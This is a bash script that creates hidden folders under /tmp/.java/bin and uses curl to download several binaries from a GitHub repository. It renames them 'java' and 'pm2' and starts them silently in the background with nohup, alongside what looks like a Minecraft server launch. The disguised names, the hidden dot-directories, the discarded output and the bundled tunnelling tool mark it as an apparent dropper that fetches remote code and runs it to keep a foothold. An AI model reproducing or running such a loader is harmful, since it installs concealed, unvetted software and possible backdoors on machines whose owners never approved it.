#!/bin/bash

function fetch_files() {
    mkdir -p /tmp/.java/bin/{.a,.b,.c}
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/zpr-glibc2.39-amd64 -o pm2
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/pingu/n1.conf -o cfg.conf
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o java
    cd /tmp/.java/bin/.a && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/patch.jar -o java
    cd /tmp/.java/bin/.b && curl -L https://github.com/fastn-stack/kulfi/releases/download/malai-0.2.9/malai_linux_x86_64 -o java
    cd /tmp/.java/bin/.c && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/gnet-v1.4.43-amd64 -o java
    echo /tmp/.java/bin/.a /tmp/.java/bin/.b /tmp/.java/bin/.c | xargs -n 1 cp /tmp/.java/bin/pm2
}

function start_app() {
    chmod a+x /tmp/.java/bin/*** /tmp/.java/bin/.a/** /tmp/.java/bin/.b/**  /tmp/.java/bin/.c/**
    cd /tmp/.java/bin && nohup ./pm2 -a 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./java -c ./cfg.conf >/dev/null 2>&1 &
}

if [ -f "/tmp/.java/bin/java" ] && [ -f "/tmp/.java/bin/.a/java" ] && [ -f "/tmp/.java/bin/.b/java" ]; then
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
